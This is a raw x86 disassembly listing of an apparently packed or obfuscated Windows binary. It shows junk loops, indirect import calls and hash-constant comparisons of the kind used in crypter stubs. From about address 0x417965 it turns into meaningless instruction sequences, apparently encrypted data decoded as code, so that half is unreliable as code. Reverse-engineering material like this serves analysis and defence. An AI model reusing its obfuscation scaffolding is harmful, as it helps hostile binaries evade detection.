  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     cl,BYTE PTR [ebp-0x7b18557a]
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	neg    DWORD PTR [edi-0x3176c38c]
  417983:	les    esp,FWORD PTR [eax-0x4ee8f6b7]
  417989:	mov    ds:0xbcb2c882,al
  41798e:	das    
  41798f:	mov    edi,0x532bed82
  417994:	mov    dl,0x3b
  417996:	popa   
  417997:	repnz and al,0x60
  41799a:	push   edx
  41799b:	xor    esi,DWORD PTR [ebx-0x2a]
  41799e:	pop    ds
  41799f:	and    al,0x68
  4179a1:	mov    DWORD PTR [eax-0x6d],esi
  4179a4:	fucompp 
  4179a6:	sub    eax,0x3e42c0bf
  4179ab:	adc    BYTE PTR [ecx-0x68],ah
  4179ae:	mov    cl,0x69
  4179b0:	mov    dl,0x75
  4179b2:	xchg   edx,eax
  4179b3:	xlat   BYTE PTR ds:[ebx]
  4179b4:	adc    BYTE PTR [ecx],ah
  4179b6:	(bad)  
  4179b7:	shl    DWORD PTR [esi+0x7f],0x3b
  4179bb:	popa   
  4179bc:	rcr    DWORD PTR [edi+0x40bad974],1
  4179c2:	mov    esp,0x7fa7bd2e
  4179c7:	cwde   
  4179c8:	xor    DWORD PTR [edi-0x79],ebp
  4179cb:	rcr    BYTE PTR [ebp+0x5ff99e8d],0xd6
  4179d2:	mov    BYTE PTR [eax+0x17d43a0c],bh
  4179d8:	loopne 0x417962
  4179da:	lahf   
  4179db:	repz pop edx
  4179dd:	test   DWORD PTR [eax+0x3975c0e1],esp
  4179e3:	pop    ecx
  4179e4:	fwait
  4179e5:	aas    
  4179e6:	lods   ax,WORD PTR ds:[esi]
  4179e8:	sbb    DWORD PTR [ebp-0x7a9d07dd],ecx
  4179ee:	jmp    0xbe01:0x246f6f67
  4179f5:	xchg   esi,eax
  4179f6:	sar    BYTE PTR [esi-0x14],cl
  4179f9:	mov    bh,0xef
  4179fb:	xchg   ebp,eax
  4179fc:	pop    ds
  4179fd:	int    0x65
  4179ff:	sub    eax,0x49bfbf88
  417a04:	or     al,0x49
  417a06:	push   ecx
  417a07:	sub    DWORD PTR [esi],esi
  417a09:	mov    dl,0x8
  417a0b:	xchg   ecx,eax
  417a0c:	leave  
  417a0d:	push   ebp
  417a0e:	aas    
  417a0f:	xlat   BYTE PTR ds:[ebx]
  417a10:	push   0xb9d66acd
  417a15:	mov    eax,ds:0x9e382a26
  417a1a:	mov    ds:0xbc36cc75,al
  417a1f:	outs   dx,BYTE PTR ds:[esi]
  417a20:	inc    ebp
  417a21:	mov    dh,0x1f
  417a23:	xchg   DWORD PTR [edx],edi
  417a25:	test   DWORD PTR [esi+0x55a9e6b8],edx
  417a2b:	outs   dx,BYTE PTR ds:[esi]
  417a2c:	inc    edi
  417a2d:	pop    edx
  417a2e:	cmp    bl,ch
  417a30:	test   DWORD PTR [ecx],esp
  417a32:	xchg   ebx,eax
  417a33:	or     al,0xd7
  417a35:	add    eax,0x64c5e95b
  417a3a:	inc    esi
  417a3b:	ror    eax,1
  417a3d:	add    DWORD PTR [eax+0x174179dd],edx
  417a43:	sub    al,0xb3
  417a45:	mov    eax,0x4ccfaefe
  417a4a:	sub    al,0x7b
  417a4c:	xor    BYTE PTR [edx],0x59
  417a4f:	cmc    
  417a50:	retf   0x650d
  417a53:	xor    BYTE PTR [eax+eax*4+0x78],0xd8
  417a58:	xlat   BYTE PTR ds:[ebx]
  417a59:	and    al,0xbf
  417a5b:	mul    BYTE PTR [eax]
  417a5d:	sbb    DWORD PTR [edx+0x1486d045],eax
  417a63:	in     eax,0x94
  417a65:	in     eax,0x9a
  417a67:	cwde   
  417a68:	adc    DWORD PTR [ebx-0x299c87e1],0x3c
  417a6f:	adc    eax,0x53bb8bf3
  417a74:	(bad)  
  417a75:	sub    eax,0x1130414a
  417a7a:	inc    esp
  417a7b:	xor    BYTE PTR [esi-0x41],al
  417a7e:	jae    0x417a4d
  417a80:	adc    BYTE PTR [esi],bl
  417a82:	mov    ebp,0xbf1bdfe4
  417a87:	mov    ecx,0x723c88f2
  417a8c:	or     al,0x67
  417a8e:	jg     0x417acc
  417a90:	xchg   esp,eax
  417a91:	or     al,0xf0
  417a93:	neg    BYTE PTR [eax]
  417a95:	adc    ch,BYTE PTR [ecx]
  417a97:	into   
  417a98:	test   eax,0x86126399
  417a9d:	scas   al,BYTE PTR es:[edi]
  417a9e:	mov    ds:0xda9e89ed,al
  417aa3:	outs   dx,BYTE PTR ds:[esi]
  417aa4:	adc    bh,0x5e
  417aa7:	pop    edi
  417aa8:	mov    gs,ebp
  417aaa:	jmp    0xac75:0x22e6854e
  417ab1:	jne    0x417af4
  417ab3:	jae    0x417a39
  417ab5:	lock xchg BYTE PTR [eax+0x1e022102],al
  417abc:	ret    0x1407
  417abf:	pusha  
  417ac0:	dec    ebx
  417ac1:	test   al,0xec
  417ac3:	(bad)  
  417ac4:	sbb    ebp,edx
  417ac6:	je     0x417aa4
  417ac8:	xchg   ebp,eax
  417ac9:	inc    ecx
  417aca:	fs imul esi,esi,0x5
  417ace:	ret    
  417acf:	mov    ds:0x2962115c,al
  417ad4:	and    eax,0xfac74d23
  417ad9:	pop    edx
  417ada:	and    al,0xfa
  417adc:	pop    ecx
  417add:	mov    edi,0x8b76f470
  417ae2:	retf   0x1e5b
  417ae5:	sbb    bl,BYTE PTR [ebp-0x68]
  417ae8:	push   ecx
  417ae9:	mov    esi,0x781256e9
  417aee:	and    bh,BYTE PTR [eax-0x2c]
  417af1:	hlt    
  417af2:	push   edx
  417af3:	dec    esi
  417af4:	repz jp 0x417abe
  417af7:	and    dl,BYTE PTR [ebx-0x58524c71]
  417afd:	xor    al,0x47
  417aff:	int    0x10
  417b01:	rcl    esi,0x52
  417b04:	or     al,0xa9
  417b06:	aaa    
  417b07:	stos   BYTE PTR es:[edi],al
  417b08:	or     eax,0xfe4ab82c
  417b0d:	inc    edx
  417b0e:	test   edx,ebx
  417b10:	inc    ecx
  417b11:	and    DWORD PTR [ecx+0x3c],edx
  417b14:	sub    BYTE PTR [eax-0x3c1bb27e],dl
  417b1a:	fisttp QWORD PTR [esi-0x58dd1cea]
  417b20:	stos   DWORD PTR es:[edi],eax
  417b21:	and    al,BYTE PTR [edx]
  417b23:	pusha  
  417b24:	(bad)  
  417b25:	jle    0x417b73
  417b27:	jb     0x417b86
  417b29:	xchg   edi,eax
  417b2a:	dec    edi
  417b2b:	jb     0x417af1
  417b2d:	rcl    DWORD PTR [ebx+esi*2+0x69],1
  417b31:	ret    0x2d38
  417b34:	retf   0x3d71
  417b37:	pop    ecx
  417b38:	gs push 0xffffffa9
  417b3b:	popf   
  417b3c:	in     al,dx
  417b3d:	ret    
  417b3e:	mov    ds:0x62ea9fc1,al
  417b43:	test   eax,0x8ee35abf
  417b48:	xchg   ebx,eax
  417b49:	and    eax,DWORD PTR [ebx-0x15]
  417b4c:	cwde   
  417b4d:	in     al,dx
  417b4e:	jae    0x417bb3
  417b50:	xor    BYTE PTR [ecx-0x59],cl
  417b53:	cwde   
  417b54:	and    cl,BYTE PTR [ebx]
  417b56:	ja     0x417b08
  417b58:	sub    BYTE PTR [ebx],ch
  417b5a:	mov    ch,0xd5
  417b5c:	dec    ebx
  417b5d:	mov    ds:0x51071666,eax
  417b62:	mov    cl,0xfa
  417b64:	push   ss
  417b65:	cmp    DWORD PTR ds:0x8234b06,edi
  417b6b:	lea    esi,ds:0x1ce49eb4
  417b71:	test   al,0x7f
  417b73:	retf   
  417b74:	pop    ebx
  417b75:	cmp    bh,BYTE PTR [ebx]
  417b77:	sbb    DWORD PTR [edx-0x5a3d96a4],0x45
  417b7e:	loopne 0x417b6d
  417b80:	ss jg  0x417b69
  417b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b84:	add    BYTE PTR [ebx],ah
  417b86:	sbb    BYTE PTR [eax-0x4d769070],cl
  417b8c:	and    al,0x31
  417b8e:	jns    0x417b15
  417b90:	xchg   edx,eax
  417b91:	mov    WORD PTR [edx],ds
  417b93:	xor    al,0x65
  417b95:	xchg   edx,eax
  417b96:	mov    edi,0x53f09aaa
  417b9b:	mov    ebp,0x19a46a9d
  417ba0:	add    eax,0x31614319
  417ba5:	pusha  
  417ba6:	fiadd  WORD PTR [ecx+0xe]
  417ba9:	ja     0x417bfe
  417bab:	mov    eax,ds:0x9d811b99
  417bb0:	(bad)  
  417bb2:	sbb    ch,ch
  417bb4:	repnz mov eax,fs:0x37c424a9
  417bbb:	sub    eax,0xb31b7b64
  417bc0:	lock xor eax,0xe352376c
  417bc6:	aam    0x71
  417bc8:	int3   
  417bc9:	out    0x88,al
  417bcb:	retf   0x4dc
  417bce:	xchg   ebp,eax
  417bcf:	sbb    al,0xb0
  417bd1:	ret    0xfd04
  417bd4:	xchg   DWORD PTR [edx-0x48],edx
  417bd7:	mov    ecx,0xbfeb1756
  417bdc:	add    BYTE PTR [ebp+0x51],cl
  417bdf:	mov    ds:0xfa87cb66,eax
  417be4:	cdq    
  417be5:	nop
  417be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417be7:	ficomp DWORD PTR [eax-0x63]
  417bea:	lods   al,BYTE PTR ds:[esi]
  417beb:	bts    DWORD PTR cs:[esi-0x2a8caca0],edx
  417bf3:	iret   
  417bf4:	test   dl,bl
  417bf6:	xchg   ebx,eax
  417bf7:	sbb    al,0xbd
  417bf9:	pop    esi
  417bfa:	ret    0x907d
  417bfd:	out    dx,eax
  417bfe:	ja     0x417c47
  417c00:	inc    ecx
  417c01:	retf   0x462e
  417c04:	jae    0x417c28
  417c06:	das    
  417c07:	push   0xb0864316
  417c0c:	ficomp WORD PTR [eax-0x620582bc]
  417c12:	das    
  417c13:	fist   DWORD PTR [ecx-0x50d33031]
  417c19:	push   edi
  417c1a:	out    dx,eax
  417c1b:	pop    ds
  417c1c:	int    0x18
  417c1e:	sti    
  417c1f:	pop    es
  417c20:	int    0xcc
  417c22:	mov    eax,0x850795c4
  417c27:	ss shl esp,1
  417c2a:	pop    esi
  417c2b:	dec    esp
  417c2c:	mov    ah,BYTE PTR [eax+0x3da26d2f]
  417c32:	call   0x86cc9a7c
  417c37:	adc    eax,0x7e29fb2c
  417c3c:	cmp    al,ah
  417c3e:	xchg   edx,eax
  417c3f:	or     eax,ebx
  417c41:	into   
  417c42:	xor    al,0x24
  417c44:	(bad)  
  417c45:	mov    bh,0xdf
  417c47:	out    dx,al
  417c48:	add    al,0x1f
  417c4a:	stos   BYTE PTR es:[edi],al
  417c4b:	inc    esp
  417c4c:	bound  edx,QWORD PTR [ebp+0x19a7b362]
  417c52:	retf   0x9f1c
  417c55:	jo     0x417c95
  417c57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c58:	xchg   DWORD PTR [edi],edx
  417c5a:	xchg   esp,eax
  417c5b:	cmp    al,0x5d
  417c5d:	aaa    
  417c5e:	push   0x64
  417c60:	xor    BYTE PTR [ecx],bl
  417c62:	outs   dx,BYTE PTR ds:[esi]
  417c63:	or     eax,0x3818c72c
  417c68:	dec    ecx
  417c69:	and    BYTE PTR [edx+0x5a],0x9a
  417c6d:	pop    ebp
  417c6e:	int3   
  417c6f:	retf   
  417c70:	in     al,dx
  417c71:	adc    al,0x24
  417c73:	xchg   esi,eax
  417c74:	arpl   WORD PTR [edx-0x5f],sp
  417c77:	jbe    0x417c30
  417c79:	dec    esi
  417c7a:	cmc    
  417c7b:	into   
  417c7c:	push   es
  417c7d:	bound  ebx,QWORD PTR [edx+0x54]
  417c80:	loopne 0x417c4b
  417c82:	jne    0x417c22
  417c84:	cmp    BYTE PTR [esi+ecx*1-0x662ff14b],al
  417c8b:	sub    ah,BYTE PTR [esi+0x5c]
  417c8e:	or     eax,0x86700df4
  417c93:	aas    
  417c94:	bound  ecx,QWORD PTR [edx-0x67b4961a]
  417c9a:	cli    
  417c9b:	xchg   esi,eax
  417c9c:	pop    es
  417c9d:	push   esi
  417c9e:	test   DWORD PTR ds:0x12a628fb,ebx
  417ca4:	out    0xfc,eax
  417ca6:	inc    edx
  417ca7:	inc    esp
  417ca8:	mov    ds:0x3b52f9be,al
  417cad:	pop    ebp
  417caf:	push   esp
  417cb0:	fld    TBYTE PTR [ecx-0x4d657fa4]
  417cb6:	pop    esp
  417cb7:	mov    ebp,edx
  417cb9:	ins    DWORD PTR es:[edi],dx
  417cba:	and    BYTE PTR [edx-0xc],dl
  417cbd:	popa   
  417cbe:	pop    esp
  417cbf:	or     al,0xc0
  417cc1:	fisubr DWORD PTR [ecx+0x3917d318]
  417cc7:	mov    bh,0xdc
  417cc9:	shl    DWORD PTR [ebp+0x4b6cf7e2],cl
  417ccf:	cli    
  417cd0:	repnz test DWORD PTR [ebp+0x254d79c0],esi
  417cd7:	and    edi,DWORD PTR [ecx+ebp*8-0x9]
  417cdb:	lods   al,BYTE PTR ds:[esi]
  417cdc:	imul   edx,esi,0x5547afca
  417ce2:	scas   al,BYTE PTR es:[edi]
  417ce3:	mov    bl,0x34
  417ce5:	into   
  417ce6:	xchg   ebp,eax
  417ce7:	push   ebp
  417ce8:	mov    eax,ds:0x44d35cd
  417ced:	pop    esi
  417cee:	lods   eax,DWORD PTR ds:[esi]
  417cef:	inc    eax
  417cf0:	(bad)  
  417cf1:	ins    DWORD PTR es:[edi],dx
  417cf2:	xchg   ecx,eax
  417cf3:	out    0x30,eax
  417cf5:	call   0x7967:0x1fdfa866
  417cfc:	repz jl 0x417d3f
  417cff:	sahf   
  417d00:	or     BYTE PTR [ebx],bl
  417d02:	test   BYTE PTR [ebp-0x2],dl
  417d05:	mov    ds:0x48e620a9,al
  417d0a:	jmp    0xb74e18dc
  417d0f:	test   BYTE PTR [edi],bh
  417d11:	retf   
  417d12:	dec    ebp
  417d13:	dec    edi
  417d15:	int    0x5e
  417d17:	mov    edi,0xe09b057f
  417d1c:	aad    0xdd
  417d1e:	hlt    
  417d1f:	jne    0x417d3e
  417d21:	inc    ecx
  417d22:	pminub mm1,QWORD PTR [esp+ecx*1-0x7e]
  417d27:	jo     0x417d7b
  417d29:	or     bl,BYTE PTR [esi+0xe]
  417d2c:	ret    
  417d2d:	push   ebx
  417d2e:	cli    
  417d2f:	dec    ebx
  417d30:	data16 mov WORD PTR [ecx+eiz*1+0x7af9656d],fs
  417d38:	xchg   edi,eax
  417d39:	xor    DWORD PTR [esi],edi
  417d3b:	ficomp WORD PTR [esi-0x35]
  417d3e:	(bad)
  417d42:	int3   
  417d43:	push   esi
  417d44:	jns    0x417d38
  417d46:	add    eax,0x60870600
  417d4b:	mov    ch,0xd7
  417d4d:	int    0x71
  417d4f:	test   BYTE PTR [edx-0x2382865a],dh
  417d55:	aas    
  417d56:	sub    cl,BYTE PTR [edi+ecx*2]
  417d59:	adc    BYTE PTR [esi+0x7d],dl
  417d5c:	in     al,0xc7
  417d5e:	adc    eax,0xc95c4b0d
  417d63:	sub    cl,bl
  417d65:	(bad)  
  417d66:	std    
  417d67:	daa    
  417d68:	sbb    ebp,eax
  417d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d6b:	sbb    eax,0xf90b381f
  417d70:	std    
  417d71:	mov    ah,0x82
  417d73:	sbb    esp,edi
  417d75:	popa   
  417d76:	add    BYTE PTR [edx+0x5b],bh
  417d79:	jl     0x417d9c
  417d7b:	sub    al,0x41
  417d7d:	add    BYTE PTR [edi+0x5b],dh
  417d80:	push   es
  417d81:	in     eax,0x50
  417d83:	stc    
  417d84:	mov    ah,0x51
  417d86:	sbb    eax,0xbeb32a9e
  417d8b:	out    dx,eax
  417d8c:	mov    bl,0x52
  417d8e:	cmp    BYTE PTR [eax+0x493f92b9],ch
  417d94:	pop    ebp
  417d95:	(bad)  
  417d96:	push   ecx
  417d97:	add    ch,BYTE PTR [ecx+0x1e52acb8]
  417d9d:	sbb    BYTE PTR [edi],0xb
  417da0:	mov    bl,0xf4
  417da2:	inc    edx
  417da3:	push   ebx
  417da4:	push   DWORD PTR [ebx+ebp*8-0x76e40218]
  417dab:	call   0xf1b8391e
  417db0:	leave  
  417db1:	jne    0x417d5e
  417db3:	rcl    ecx,1
  417db5:	outs   dx,BYTE PTR ds:[esi]
  417db6:	jge    0x417d38
  417db8:	aad    0x9a
  417dba:	aam    0x1c
  417dbc:	ffreep st(5)
  417dbe:	add    ebp,DWORD PTR [edi-0x64a077c6]
  417dc4:	mov    esp,0xecde830f
  417dc9:	test   eax,0xfe5fa8a4
  417dce:	dec    ecx
  417dcf:	mov    al,ds:0x43e3e166
  417dd4:	jge    0x417d76
  417dd6:	push   0x1276d495
  417ddb:	xchg   bl,dl
  417ddd:	fidiv  DWORD PTR [edi]
  417ddf:	rcl    BYTE PTR [ebp-0xf0b7e06],cl
  417de5:	je     0x417e0e
  417de7:	sbb    dh,BYTE PTR [ebx]
  417de9:	std    
  417dea:	in     eax,0x0
  417dec:	rep stos BYTE PTR es:[edi],al
  417dee:	jne    0x417de7
  417df0:	pusha  
  417df1:	test   BYTE PTR [esi],bh
  417df3:	inc    eax
  417df4:	test   ebp,edx
  417df6:	cmp    dh,dh
  417df8:	mov    ebp,0xfa8cb651
  417dfd:	daa    
  417dfe:	inc    eax
  417dff:	daa    
  417e00:	leave  
  417e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e02:	mov    ch,0xc0
  417e04:	aas    
  417e05:	jns    0x417da6
  417e07:	add    DWORD PTR [eax+0x182181cf],ecx
  417e0d:	xchg   esi,eax
  417e0e:	mov    WORD PTR [ebx-0x56ac0d32],ss
  417e14:	out    dx,eax
  417e15:	add    bl,al
  417e17:	inc    edx
  417e18:	retf   
  417e19:	mov    al,ds:0x47f0394a
  417e1e:	popf   
  417e1f:	inc    ebx
  417e20:	cli    
  417e21:	int    0xc1
  417e23:	cld    
  417e24:	cs jmp 0x8fe0:0x9feeea8d
  417e2c:	cmp    DWORD PTR [ebx+0x74],esp
  417e2f:	test   eax,0x2a97d5a2
  417e34:	push   edx
  417e35:	push   edi
  417e36:	mov    eax,0x21d5c5fa
  417e3b:	sbb    eax,0x77409a05
  417e40:	les    esp,FWORD PTR [edi+0x64136196]
